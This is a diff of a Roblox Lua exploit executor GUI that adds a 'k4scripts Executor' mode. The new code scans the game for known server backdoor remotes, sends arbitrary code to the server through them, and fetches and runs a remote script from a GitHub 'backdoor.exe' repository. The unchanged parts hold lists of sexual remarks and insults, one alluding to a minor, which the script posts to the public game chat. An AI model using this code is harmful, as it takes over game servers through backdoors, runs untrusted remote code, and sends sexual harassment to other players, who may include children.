@@ -1,8 +1,3 @@
--- Gui to Lua
--- Version: 3.2
-
--- Instances:
-
 game.CoreGui.RobloxGui.NotificationFrame.ChildAdded:Connect(function()
 	local a = coroutine.create(function()
 		for _,v in ipairs(game.CoreGui.RobloxGui.NotificationFrame:GetDescendants()) do
@@ -97,15 +92,17 @@ local TextContainer = Instance.new("TextLabel")
 local Inject = Instance.new("TextButton")
 local UICorner_15 = Instance.new("UICorner")
 local Minimize = Instance.new("TextButton")
+local k4executor = Instance.new("TextButton")
+local UICorner_16 = Instance.new("UICorner")
 local Minimize_2 = Instance.new("TextButton")
 local Logo_2 = Instance.new("Frame")
 local Circle_2 = Instance.new("Frame")
-local UICorner_16 = Instance.new("UICorner")
+local UICorner_17 = Instance.new("UICorner")
 local Arrows = Instance.new("ImageLabel")
 local ImageLabel_6 = Instance.new("ImageLabel")
-local UICorner_17 = Instance.new("UICorner")
-local InnerCircle_2 = Instance.new("Frame")
 local UICorner_18 = Instance.new("UICorner")
+local InnerCircle_2 = Instance.new("Frame")
+local UICorner_19 = Instance.new("UICorner")
 local Center = Instance.new("ImageLabel")
 local Cog = Instance.new("ImageLabel")
 local ImageLabel_7 = Instance.new("ImageLabel")
@@ -223,8 +220,8 @@ MainGui.AnchorPoint = Vector2.new(0.200000003, 0.5)
 MainGui.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
 MainGui.Position = UDim2.new(0.200000003, 0, 0.5, 0)
 MainGui.Size = UDim2.new(0, 700, 0, 400)
-MainGui.ZIndex = -3
 MainGui.Visible = false
+MainGui.ZIndex = -3
 
 UICorner_4.Parent = MainGui
 
@@ -526,6 +523,20 @@ Minimize.TextScaled = true
 Minimize.TextSize = 14.000
 Minimize.TextWrapped = true
 
+k4executor.Name = "k4executor"
+k4executor.Parent = EXECUTOR_2
+k4executor.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+k4executor.Position = UDim2.new(0, 500, 0, 200)
+k4executor.Size = UDim2.new(0, 150, 0, 50)
+k4executor.ZIndex = 2000
+k4executor.Font = Enum.Font.SourceSansBold
+k4executor.Text = "k4 Executor"
+k4executor.TextColor3 = Color3.fromRGB(60, 60, 60)
+k4executor.TextSize = 30.000
+k4executor.TextWrapped = true
+
+UICorner_16.Parent = k4executor
+
 Minimize_2.Name = "Minimize"
 Minimize_2.Parent = MainGui
 Minimize_2.AnchorPoint = Vector2.new(1, 0)
@@ -556,8 +567,8 @@ Circle_2.Position = UDim2.new(0.5, 0, 0.5, 0)
 Circle_2.Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
 Circle_2.ZIndex = 10
 
-UICorner_16.CornerRadius = UDim.new(1, 8)
-UICorner_16.Parent = Circle_2
+UICorner_17.CornerRadius = UDim.new(1, 8)
+UICorner_17.Parent = Circle_2
 
 Arrows.Name = "Arrows"
 Arrows.Parent = Circle_2
@@ -581,8 +592,8 @@ ImageLabel_6.ZIndex = 11
 ImageLabel_6.Image = "http://www.roblox.com/asset/?id=6023426928"
 ImageLabel_6.ImageColor3 = Color3.fromRGB(136, 0, 0)
 
-UICorner_17.CornerRadius = UDim.new(0, 100)
-UICorner_17.Parent = Logo_2
+UICorner_18.CornerRadius = UDim.new(0, 100)
+UICorner_18.Parent = Logo_2
 
 InnerCircle_2.Name = "InnerCircle"
 InnerCircle_2.Parent = Logo_2
@@ -592,8 +603,8 @@ InnerCircle_2.Position = UDim2.new(0.5, 0, 0.5, 0)
 InnerCircle_2.Size = UDim2.new(0.5, 0, 0.5, 0)
 InnerCircle_2.ZIndex = 10
 
-UICorner_18.CornerRadius = UDim.new(1, 8)
-UICorner_18.Parent = InnerCircle_2
+UICorner_19.CornerRadius = UDim.new(1, 8)
+UICorner_19.Parent = InnerCircle_2
 
 Center.Name = "Center"
 Center.Parent = InnerCircle_2
@@ -645,11 +656,11 @@ Toggle.TextWrapped = true
 
 -- Scripts:
 
-local function WQUTBZ_fake_script() -- CodeEntry.LocalScript 
+local function XMLORVY_fake_script() -- CodeEntry.LocalScript 
 	local script = Instance.new('LocalScript', CodeEntry)
 
 	local Code = script.Parent
-	
+
 	function onKeyPress(inputObject, gameProcessedEvent)
 		local len = Code.Text:len()
 		if inputObject.KeyCode == Enum.KeyCode.Return and script.Parent:IsFocused() then
@@ -659,12 +670,12 @@ local function WQUTBZ_fake_script() -- CodeEntry.LocalScript
 			end
 		end
 	end
-	
-	
+
+
 	game:GetService("UserInputService").InputBegan:connect(onKeyPress)
 end
-coroutine.wrap(WQUTBZ_fake_script)()
-local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript 
+coroutine.wrap(XMLORVY_fake_script)()
+local function XCZP_fake_script() -- ScrollingFrame.LocalScript 
 	local script = Instance.new('LocalScript', ScrollingFrame)
 
 	stringArrayToTextLabels = (function(strings, par) 
@@ -689,46 +700,46 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 				lab.BackgroundTransparency = 1
 				lab.Font = "Arial" .. (w[3]~=nil and "Bold" or "")
 				lab.FontSize = "Size12"
-	
+
 				wait()
-	
+
 				lab.Size = UDim2.new(0, lab.TextBounds.X, 0, lab.TextBounds.Y)
 				pos = pos + UDim2.new(0, lab.TextBounds.X, 0,0)
 			end
 		end
 	end)
-	
+
 	Colors = {
 		BLUE = Color3.new(34/255, 70/255, 128/255),
 		GREEN = Color3.new(35/255, 110/255, 20/255),
 		BLACK = Color3.new(.7, .7, .7),
 		AQUA = Color3.new(46/255, 111/255, 125/255),
 	}
-	
+
 	Syntax = {
 		BLUE = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
 	}
-	
+
 	NEWLINE = {"^n"}
 	TAB = {"^t"}
 	LINEBREAK = {"^r"}
-	
+
 	-- tab is char 9
 	colorizeLines = (function(lines)
 		local instructs = {}
-	
+
 		local currLine = 0
 		for q,w in pairs(lines) do
 			currLine = currLine + 1
 			table.insert(instructs, {tostring(currLine)..".",  Colors.AQUA})
 			table.insert(instructs, {"^t"})
-	
+
 			local contigiousWord = ""
-	
+
 			local induceContig = function(dontAppendSpace)
 				local contigColor = Colors.BLACK
 				local met = false
-	
+
 				for e,r in pairs(Syntax) do
 					if (not met) then
 						for t,y in pairs(r) do
@@ -740,7 +751,7 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 						end
 					end
 				end
-	
+
 				if (contigColor == Colors.BLUE) then
 					table.insert(instructs, {contigiousWord..(dontAppendSpace and "" or " "), contigColor, true})
 				else
@@ -748,7 +759,7 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 				end
 				contigiousWord = ""
 			end
-	
+
 			for i = 1,w:len() do
 				local j = w:sub(i,i)
 				if (string.byte(j) == 9) then
@@ -757,7 +768,7 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 					induceContig()
 				elseif (string.byte(j) >= 48 and string.byte(j) <=57) then -- check if number
 					induceContig(true)
-	
+
 					table.insert(instructs, {j, Colors.AQUA})
 				else
 					if i > 1 then
@@ -766,21 +777,23 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 							break
 						end
 					end
-	
+
 					contigiousWord = contigiousWord .. j
 				end
 			end
-	
+
 			induceContig()
-	
+
 			table.insert(instructs, NEWLINE)
 		end
-	
+
 		return instructs;
 	end)
-	
+
+	runwith = nil
 	EXECUTOR = nil
-	
+	k4executor = false
+
 	script.Parent.Parent.Execute.MouseButton1Click:Connect(function()
 		script.Parent.CodeEntry.TextTransparency = 1
 		for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
@@ -793,12 +806,25 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 		if EXECUTOR == nil then
 			stringArrayToTextLabels(colorizeLines({"Can't execute! There's no backdoor to execute to."}),script.Parent.TextContainer)		
 		else
+			warn("Executor = "..EXECUTOR.Name)
 			stringArrayToTextLabels(colorizeLines({script.Parent.CodeEntry.Text}),script.Parent.TextContainer)	
-			EXECUTOR:FireServer(script.Parent.CodeEntry.Text)
+			if EXECUTOR:IsA("RemoteFunction") then
+				if runwith == nil then
+					EXECUTOR:InvokeServer(script.Parent.CodeEntry.Text)
+				else
+					EXECUTOR:InvokeServer(unpack(runwith),script.Parent.CodeEntry.Text)
+				end
+			else
+				if runwith == nil then
+					EXECUTOR:FireServer(script.Parent.CodeEntry.Text)
+				else
+					EXECUTOR:FireServer(unpack(runwith),script.Parent.CodeEntry.Text)
+				end
+			end
 		end
 	end)
-	
-	
+
+
 	script.Parent.CodeEntry.Focused:Connect(function()
 		for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
 			if a:IsA("UIPageLayout") then
@@ -809,104 +835,259 @@ local function QSXPQQ_fake_script() -- ScrollingFrame.LocalScript
 		end
 		script.Parent.CodeEntry.TextTransparency = 0
 	end)
-	
+
+	script.Parent.Parent.k4executor.MouseButton1Click:Connect(function()
+		if k4executor == true then
+			k4executor = false
+			script.Parent.Parent.k4executor.TextColor3 = Color3.fromRGB(60,60,60)
+		else
+			k4executor = true
+			script.Parent.Parent.k4executor.TextColor3 = Color3.fromRGB(255,255,255)
+		end
+	end)
+
 	script.Parent.Parent.Inject.MouseButton1Click:Connect(function()
-		local a = coroutine.create(function()
-			for _,selectedobject in pairs(game:GetDescendants()) do
-				if selectedobject:IsA("RemoteEvent") and selectedobject.Name == "MMSBVerifier" then
-					EXECUTOR = selectedobject
-				elseif selectedobject:IsA("ModuleScript") then
-					for _,children in pairs(selectedobject:GetChildren()) do
-						if children.Name == "Rerubi" or children.Name == "LuaU" then
-							for _,remotesearch in pairs(selectedobject.Parent.Parent:GetDescendants()) do
-								if remotesearch:IsA("RemoteEvent") then
-									EXECUTOR = selectedobject
-									script.Parent.CodeEntry.TextTransparency = 1
-									stringArrayToTextLabels(colorizeLines({"Backdoor found."}),script.Parent.TextContainer)
-									wait(4)
-									for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-										if a:IsA("UIPageLayout") then
-										else
-											a:Destroy()
-											game["Run Service"].Heartbeat:Wait()
+		if k4executor == true then
+			script.Parent.CodeEntry.TextTransparency = 1
+			stringArrayToTextLabels(colorizeLines({"Using the k4scripts Executor may ban you from the game. Leave in 10 seconds to avoid risk"}),script.Parent.TextContainer)
+			wait(7)
+			for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+				if a:IsA("UIPageLayout") then
+				else
+					a:Destroy()
+					game["Run Service"].Heartbeat:Wait()
+				end
+			end
+			script.Parent.CodeEntry.TextTransparency = 0
+			wait(3)
+
+			local b270 = coroutine.create(function()
+				local LocalPlayer = game:GetService("Players").LocalPlayer
+				local invCode = "6HndYgC"
+
+				local alternativeSS = {
+					run = { [1] = "5#lGIERKWEF" },
+					emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
+					helpme = { [1] = "helpme" },
+					pickett = { [1] = "cGlja2V0dA==" },
+					harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
+				}
+
+				local function notify(text)
+					game:GetService("StarterGui"):SetCore(
+					"SendNotification",
+					{
+						Title = "k4scripts Credit",
+						Duration = 3,
+						Text = text
+					}
+					)
+				end
+
+				local function attached(possibleWait)
+					if possibleWait then wait(possibleWait) end
+					return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
+				end
+
+				local function validRemote(rm, _className)
+					local fullName =  rm:GetFullName()
+
+					if string.find(fullName, "DefaultChat") then return false end
+					if string.find(fullName, LocalPlayer.Name) then return false end
+					if rm:FindFirstChild("__FUNCTION") then return false end
+					if rm.Parent == game:GetService("JointsService") then return false end
+
+					if rm.ClassName ~= _className then return false end
+
+					if getgenv().blacklisted then
+						if table.find(getgenv().blacklisted, fullName) then return false end
+					end
+
+					return true
+				end
+
+				local function harked()
+					local Backpack = LocalPlayer.Backpack 
+					return Backpack:FindFirstChild("HandlessSegway") and
+						Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+						Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+				end
+				local function emmaBackdoor(rm)
+					return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
+				end
+				local function runBackdoor(rm)
+					return rm.Name == "Run" and
+						rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
+						rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
+				end
+
+				local function scanGame()
+					if harked() then
+						loadstring(game:HttpGetAsync(alternativeSS.harked))()
+						return
+					end
+
+					for _, remote in pairs(game:GetDescendants()) do
+						if validRemote(remote, "RemoteEvent") and not attached() then
+							if emmaBackdoor(remote) then
+								runwith = alternativeSS.emma
+								EXECUTOR = remote
+							end
+							if runBackdoor(remote) then
+								runwith = alternativeSS.run
+								EXECUTOR = remote
+							end
+
+							runwith = alternativeSS.helpme
+							EXECUTOR = remote
+
+						end
+					end
+
+					for _, remote in pairs(game:GetDescendants()) do
+						if validRemote(remote, "RemoteFunction") and not attached() then
+							remote:InvokeServer()
+						end
+					end
+
+				end
+
+				local function Main()
+					notify("Make sure to join the k4scripts Discord!\nCode: "..invCode)
+
+					scanGame()
+
+					if not attached(2) then
+						script.Parent.CodeEntry.TextTransparency = 1
+						stringArrayToTextLabels(colorizeLines({"Failed to allocate Backdoor."}),script.Parent.TextContainer)
+						wait(4)
+						for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+							if a:IsA("UIPageLayout") then
+							else
+								a:Destroy()
+								game["Run Service"].Heartbeat:Wait()
+							end
+						end
+						script.Parent.CodeEntry.TextTransparency = 0
+					else
+						script.Parent.CodeEntry.TextTransparency = 1
+						stringArrayToTextLabels(colorizeLines({"Backdoor found."}),script.Parent.TextContainer)
+						wait(4)
+						for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+							if a:IsA("UIPageLayout") then
+							else
+								a:Destroy()
+								game["Run Service"].Heartbeat:Wait()
+							end
+						end
+						script.Parent.CodeEntry.TextTransparency = 0
+
+					end
+				end
+
+				if game:IsLoaded() then
+					pcall(Main)
+				end
+			end)
+			coroutine.resume(b270)
+		else
+			local a = coroutine.create(function()
+				for _,selectedobject in pairs(game:GetDescendants()) do
+					if selectedobject:IsA("RemoteEvent") and selectedobject.Name == "MMSBVerifier" then
+						EXECUTOR = selectedobject
+					elseif selectedobject:IsA("ModuleScript") then
+						for _,children in pairs(selectedobject:GetChildren()) do
+							if children.Name == "Rerubi" or children.Name == "LuaU" then
+								for _,remotesearch in pairs(selectedobject.Parent.Parent:GetDescendants()) do
+									if remotesearch:IsA("RemoteEvent") or remotesearch:IsA("RemoteFunction") then
+										EXECUTOR = selectedobject
+										script.Parent.CodeEntry.TextTransparency = 1
+										stringArrayToTextLabels(colorizeLines({"Backdoor found."}),script.Parent.TextContainer)
+										wait(4)
+										for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+											if a:IsA("UIPageLayout") then
+											else
+												a:Destroy()
+												game["Run Service"].Heartbeat:Wait()
+											end
 										end
+										script.Parent.CodeEntry.TextTransparency = 0
 									end
-									script.Parent.CodeEntry.TextTransparency = 0
 								end
 							end
 						end
 					end
 				end
-			end
-			if EXECUTOR == nil then
-				script.Parent.CodeEntry.TextTransparency = 1
-				stringArrayToTextLabels(colorizeLines({"Failed to allocate Backdoor."}),script.Parent.TextContainer)
-				wait(4)
-				for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-					if a:IsA("UIPageLayout") then
-					else
-						a:Destroy()
-						game["Run Service"].Heartbeat:Wait()
+				if EXECUTOR == nil then
+					script.Parent.CodeEntry.TextTransparency = 1
+					stringArrayToTextLabels(colorizeLines({"Failed to allocate Backdoor."}),script.Parent.TextContainer)
+					wait(4)
+					for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+						if a:IsA("UIPageLayout") then
+						else
+							a:Destroy()
+							game["Run Service"].Heartbeat:Wait()
+						end
 					end
+					script.Parent.CodeEntry.TextTransparency = 0
 				end
-				script.Parent.CodeEntry.TextTransparency = 0
-			end
-		end)
-		coroutine.resume(a)
+			end)
+			coroutine.resume(a)
+		end
 	end)
-	
+
 	script.Parent.Parent.Clear.MouseButton1Click:Connect(function()
 		script.Parent.CodeEntry.Text = ""
 	end)
 end
-coroutine.wrap(QSXPQQ_fake_script)()
-local function DEHR_fake_script() -- MainGui.Dragify 
+coroutine.wrap(XCZP_fake_script)()
+local function TJPX_fake_script() -- MainGui.Dragify 
 	local script = Instance.new('LocalScript', MainGui)
 
 	local UIS = game:GetService("UserInputService")
 	local dragSpeed = -math.huge
-	
+
 	local dragToggle = nil
 	local dragInput = nil
 	local dragStart = nil
 	local dragPos = nil
-	
+
 	function dragify(Frame)
 		local function updateInput(input)
-	        local Delta = input.Position - dragStart
-	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
-	        script.Parent.Position = Position
+			local Delta = input.Position - dragStart
+			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			script.Parent.Position = Position
 		end
-		
-	    Frame.InputBegan:Connect(function(input)
-	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
-	            dragToggle = true
-	            dragStart = input.Position
-	            startPos = Frame.Position
-	            input.Changed:Connect(function()
-	                if input.UserInputState == Enum.UserInputState.End then
-	                    dragToggle = false
-	                end
-	            end)
-	        end
+
+		Frame.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Frame.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)
+			end
 		end)
-		
-	    Frame.InputChanged:Connect(function(input)
-	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-	            dragInput = input
-	        end
+
+		Frame.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
 		end)
-		
-	    game:GetService("UserInputService").InputChanged:Connect(function(input)
-	        if input == dragInput and dragToggle then
-	            updateInput(input)
-	        end
-	    end)
+
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
 	end
-	
+
 	dragify(script.Parent)
-	
-	
+
+
 	local rotate = coroutine.create(function()
 		while game["Run Service"].Heartbeat:Wait() do
 			script.Parent.Logo.Circle.Arrows.Rotation = script.Parent.Logo.Circle.Arrows.Rotation + -1
@@ -914,10 +1095,12 @@ local function DEHR_fake_script() -- MainGui.Dragify
 			script.Parent.Logo.InnerCircle.Center.Rotation = script.Parent.Logo.InnerCircle.Center.Rotation + -.2
 		end
 	end)
-	
+
 	coroutine.resume(rotate)
 end
-coroutine.wrap(DEHR_fake_script)()
+coroutine.wrap(TJPX_fake_script)()
+
+
 
 
 wait(1)
@@ -946,268 +1129,268 @@ end)
 
 GUI.Window.MainGui.TEXTSELECTION.EXECUTABLES.MouseButton1Click:Connect(function()
 	local TSE = coroutine.create(function()
-maxspeed = 60
-velocityoverlimit = false
-savedpos = Vector3.new(0,0,0)
-savedori = Vector3.new(0,0,0)
-tracebackactive = false
-savedtools = {}
-StarterGui = game:GetService("StarterGui")
-bindable = Instance.new("BindableFunction")
-aduration = 30
+		maxspeed = 60
+		velocityoverlimit = false
+		savedpos = Vector3.new(0,0,0)
+		savedori = Vector3.new(0,0,0)
+		tracebackactive = false
+		savedtools = {}
+		StarterGui = game:GetService("StarterGui")
+		bindable = Instance.new("BindableFunction")
+		aduration = 30
 
 
-SInsults = {"you lookin MIGHTY fine.","im gonna DEVOUR you tonight","DAMNNNNN","get on the bed","im finna make a model of you and put it in a jar capable of holding liquids for a long period of time","you'd look better with my liquids on you","penor","what dat mouth do","im widen a hole for you","you lookin extra breedable today, DAMN","if i was a whistle you'd be blowing on plastic right about now","gimme them slobbery lips","damn those are some thick thighs","you make me wanna whack my penor","give me them legs","im boutta start spreading ur legs","after im done with you, you wont be able to sit without making a puddle in the chair","them melons boutta be boing boing bouncing up and down","if you were a transformer, you'd be optimus fine","you lookin EXTRA crispy TODAY"}
-TInsults = {"ur a noob","ur a furry","what a poo poo head you are","child","ur dogwater","low intellect","absolute baboon","you are a toilet issue person","you're a school threat","ez","mad cuz bad","you probably a frog","you use freemodels","why are you such a loser","you are so funny omg im dying","ur sister is a witch","you probably dont even have 1TB","Dunkin' Donuts employee accused of killing customer with one punch after he was called a racial slur","suck a golfball","welcome to san adreas im cj from grove street","homicide is an optional choice","i am armed and dangerous","u converted to domestic terrorism","im gonna DEVOUR you.","gimme them legs","Geese is its own plural, stupid.","you're a joke at this point","yo mamma on my bed sheets and you're under 14","big failure","not even a belt can keep my jeans from sagging","how else could you afford all the soap that you drop?","my reputation leaves room for speculation","writin poems on tombstones","closest you ever came to a punchline was waitin for refreshments in the prom in 89'","you a punk","you probably cant even throw a football correctly","stay losing","cope harder","absolute baboon mentality","take a shower","gn kid","im staying winning and you're staying losing","what has the dog done","bye","he eatin soap","clam activity","bruh nawhhh nah bruhh nah no way bruhhh fr? Bruhhh","get real","can we ban this guy","cope on deez","this will drastically affect fishing season","diagnosis: skill issue","didnt cry about it","ok and?"}
+		SInsults = {"you lookin MIGHTY fine.","im gonna DEVOUR you tonight","DAMNNNNN","get on the bed","im finna make a model of you and put it in a jar capable of holding liquids for a long period of time","you'd look better with my liquids on you","penor","what dat mouth do","im widen a hole for you","you lookin extra breedable today, DAMN","if i was a whistle you'd be blowing on plastic right about now","gimme them slobbery lips","damn those are some thick thighs","you make me wanna whack my penor","give me them legs","im boutta start spreading ur legs","after im done with you, you wont be able to sit without making a puddle in the chair","them melons boutta be boing boing bouncing up and down","if you were a transformer, you'd be optimus fine","you lookin EXTRA crispy TODAY"}
+		TInsults = {"ur a noob","ur a furry","what a poo poo head you are","child","ur dogwater","low intellect","absolute baboon","you are a toilet issue person","you're a school threat","ez","mad cuz bad","you probably a frog","you use freemodels","why are you such a loser","you are so funny omg im dying","ur sister is a witch","you probably dont even have 1TB","Dunkin' Donuts employee accused of killing customer with one punch after he was called a racial slur","suck a golfball","welcome to san adreas im cj from grove street","homicide is an optional choice","i am armed and dangerous","u converted to domestic terrorism","im gonna DEVOUR you.","gimme them legs","Geese is its own plural, stupid.","you're a joke at this point","yo mamma on my bed sheets and you're under 14","big failure","not even a belt can keep my jeans from sagging","how else could you afford all the soap that you drop?","my reputation leaves room for speculation","writin poems on tombstones","closest you ever came to a punchline was waitin for refreshments in the prom in 89'","you a punk","you probably cant even throw a football correctly","stay losing","cope harder","absolute baboon mentality","take a shower","gn kid","im staying winning and you're staying losing","what has the dog done","bye","he eatin soap","clam activity","bruh nawhhh nah bruhh nah no way bruhhh fr? Bruhhh","get real","can we ban this guy","cope on deez","this will drastically affect fishing season","diagnosis: skill issue","didnt cry about it","ok and?"}
 
-LastInsult = nil
+		LastInsult = nil
 
-game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
-	for index,tableval in ipairs(savedtools) do
-		table.remove(savedtools,tableval)
-	end
-end)
+		game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
+			for index,tableval in ipairs(savedtools) do
+				table.remove(savedtools,tableval)
+			end
+		end)
 
-function repeatstand()
-	wait(.01)
-	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
-end
+		function repeatstand()
+			wait(.01)
+			game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
+		end
 
-AttentionColor = Color3.fromRGB(255,0,0)
-WarningColor = Color3.fromRGB(255,255,0)
-InformationColor = Color3.fromRGB(85,170,0)
+		AttentionColor = Color3.fromRGB(255,0,0)
+		WarningColor = Color3.fromRGB(255,255,0)
+		InformationColor = Color3.fromRGB(85,170,0)
 
 
-function colornotification(text,colortype)
-	for _,v in ipairs(game.CoreGui.RobloxGui.NotificationFrame:GetDescendants()) do
-		if v.Name == ("NotificationTitle") then
-			if v.Text == text then
-				v.Parent.BackgroundColor3 = Color3.fromRGB(colortype)
-				for _,b in ipairs(v.Parent:GetChildren()) do
-					if b:IsA("TextButton") then
-						b.BackgroundColor3 = Color3.fromRGB(colortype)
+		function colornotification(text,colortype)
+			for _,v in ipairs(game.CoreGui.RobloxGui.NotificationFrame:GetDescendants()) do
+				if v.Name == ("NotificationTitle") then
+					if v.Text == text then
+						v.Parent.BackgroundColor3 = Color3.fromRGB(colortype)
+						for _,b in ipairs(v.Parent:GetChildren()) do
+							if b:IsA("TextButton") then
+								b.BackgroundColor3 = Color3.fromRGB(colortype)
+							end
+						end
 					end
 				end
 			end
 		end
-	end
-end
 
 
-function bruh()
-	for _,v in pairs(game.CoreGui.RobloxGui.NotificationFrame:GetChildren()) do
-		if v.Name == "Notification" and v.NotificationTitle.Text == "Code Execution" then
-			v:Remove()
+		function bruh()
+			for _,v in pairs(game.CoreGui.RobloxGui.NotificationFrame:GetChildren()) do
+				if v.Name == "Notification" and v.NotificationTitle.Text == "Code Execution" then
+					v:Remove()
+				end
+			end	
 		end
-	end	
-end
 
-function fireresponse(name)
-	if name == "CopyToClip" then
-		StarterGui:SetCore("SendNotification", {
-			Title = "MMSB NOMAIN",
-			Text = "Successfully copied code to clipboard",
-			Duration = 5,
-			Callback = bindable
-		})
-	end
-
-	if name == "Y" then
-		loadstring(game.CoreGui.NOMAINDEV.Frame.TextBox.Text)()
-	elseif name == "N" then
-	end
-
-	if name == "SexualRemark" then
-		local insulttable = SInsults
-		local ftable = insulttable[math.random(1,#insulttable)]
-		if ftable == LastInsult then 
-			local ftable = insulttable[math.random(1,#insulttable)]
-			if ftable == LastInsult then 
+		function fireresponse(name)
+			if name == "CopyToClip" then
 				StarterGui:SetCore("SendNotification", {
-					Title = "SEXUAL REMARK",
-					Text = "Canceled Remark, Repeated Text x2.",
+					Title = "MMSB NOMAIN",
+					Text = "Successfully copied code to clipboard",
 					Duration = 5,
 					Callback = bindable
 				})
-				colornotification("SEXUAL REMARK",WarningColor)
-			else
-				if string.find(ftable,"#") then
-					StarterGui:SetCore("SendNotification", {
-						Title = "SEXUAL REMARK ERROR",
-						Text = "Message Contained Hashtags. Check Console for message",
-						Duration = 5,
-						Callback = bindable
-					})
-					warn(ftable)
-					colornotification("SEXUAL REMARK",AttentionColor)
-				else
-					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
-					LastInsult = ftable
-				end
 			end
-		else
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
-			LastInsult = ftable
-		end
-	elseif name == "MakeARemark" then
-		local insulttable = TInsults
-		local ftable = insulttable[math.random(1,#insulttable)]
-		if ftable == LastInsult then 
-			local ftable = insulttable[math.random(1,#insulttable)]
-			if ftable == LastInsult then 
-				StarterGui:SetCore("SendNotification", {
-					Title = "REMARK",
-					Text = "Canceled Remark, Repeated Text x2.",
-					Duration = 5,
-					Callback = bindable
-				})
-				colornotification("REMARK",WarningColor)
-			else
-				if string.find(ftable,"#") then
-					StarterGui:SetCore("SendNotification", {
-						Title = "REMARK ERROR",
-						Text = "Message Contained Hashtags. Check Console for message.",
-						Duration = 5,
-						Callback = bindable
-					})
-					warn(ftable)
-					colornotification("REMARK",AttentionColor)
-				else
-					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
-					LastInsult = ftable
-				end
+
+			if name == "Y" then
+				loadstring(game.CoreGui.NOMAINDEV.Frame.TextBox.Text)()
+			elseif name == "N" then
 			end
-		else
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
-			LastInsult = ftable
-		end
-	end
 
-	if name == "RandomMath" then
-		local val  = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame local r1 = math.random(-math.pi,math.pi) local r = math.random(1,2) local t = nil
-		local tg = nil
-		if r == 1 then
-			t="*"
-		else
-			t="/"
-		end
-		local m = r1 * math.random(10,28462) / r * math.floor(math.pi)
-		local args = {
-			[1] =  "you have ".. tostring(m).. " ¤™",
-			[2] = "All"
-		}
-		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-		if m <= 0 then
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("you are in debt.", "All")
-		else
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("you are rich", "All")
-		end
-	end
-
-	if name == "Anti-Fling" then
-		StarterGui:SetCore("SendNotification", {
-			Title = "MMSB NOMAIN INFORMATION",
-			Text = "Anti-Fling Enabled",
-			Duration = 5,
-			Callback = bindable
-		})
-
-		game["Run Service"].RenderStepped:Connect(function()
-			if game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity.X >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity.Y >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity.Z >= maxspeed then
-				if game.Players.LocalPlayer.Character.Humanoid.Sit ~= true then
